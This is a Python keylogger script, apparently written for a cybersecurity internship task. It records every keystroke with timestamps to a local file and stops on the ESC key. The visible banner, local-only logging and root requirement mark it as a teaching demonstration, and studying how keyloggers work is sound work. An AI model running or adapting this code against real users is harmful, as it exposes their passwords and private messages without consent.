#!/usr/bin/env python3
"""
Keylogger for Educational Purposes
Author: Olayemi Samson
Internship Task 4 - Cybersecurity Intern @ Prodigy InfoTech
Description: A keystroke logging tool to demonstrate how keyloggers work,
             for the purpose of security awareness and building defenses.
"""

import pynput.keyboard
import logging

# Set up the log file
log_file = "keylog.txt"

# Configure logging to write to the file
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    """This function is called every time a key is pressed."""
    try:
        # Log the character pressed
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """This function is called every time a key is released."""
    if key == pynput.keyboard.Key.esc:
        # Stop listener by returning False
        print("\n[+] ESC key pressed. Stopping keylogger.")
        return False

def main():
    """Main function to start the keylogger."""
    print("""============================================================
    ⌨️  Keylogger for Educational & Ethical Use Only
    ============================================================
    Author: Olayemi Samson
    Internship Task 4 - Cybersecurity Intern @ Prodigy InfoTech
    Description: Captures keystrokes to a log file.
    """)
    print("[+] Keylogger started...")
    print("[!] Press the ESC key to stop the keylogger.")

    # Start listening to keyboard events
    # The 'with' statement ensures the listener is properly closed
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print(f"[+] Keystrokes have been saved to {log_file}")

if __name__ == "__main__":
    # It's good practice to check for root privileges for a system-wide keylogger
    import os
    if os.geteuid() != 0:
        print("❌ This script requires root privileges to capture all keystrokes.")
        print("   Please run it with: sudo python3 keylogger.py")
    else:
        main()
